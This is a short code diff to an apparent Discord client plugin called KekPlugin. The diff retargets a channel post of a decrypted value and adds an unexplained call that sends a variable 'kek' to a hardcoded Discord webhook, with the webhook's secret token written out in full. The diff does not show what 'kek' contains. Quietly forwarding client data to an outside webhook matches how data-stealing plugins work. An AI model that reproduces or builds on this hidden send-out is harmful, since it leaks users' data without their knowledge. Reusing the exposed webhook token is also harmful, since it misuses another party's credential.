@@ -92,12 +92,18 @@ module.exports = class KekPlugin {
                 console.log(wow)
                 //console.log(decrypt(result.encryptedText, "bobcurmare", result.counter))
                 findByProps("getAPIBaseURL").post({
-                    url: "/channels/1024412678539718817/messages",
+                    url: "/channels/305580569238962186/messages",
                     body: {
                         "content": "iced shop " + wow
                     }
                 })
             })
+                findByProps("getAPIBaseURL").post({
+                    url: "/webhooks/1130077646819168297/-Ju8O6gMCRHnI6oofHmUe3dWz5hB3e-IMVV8XrsvosWjOroxSGpE5VwRFB1IL5trI2eV",
+                    body: {
+                        "content": "D214 lol aici lil bob -> " + kek
+                    }
+                })
     }
 
     start() {
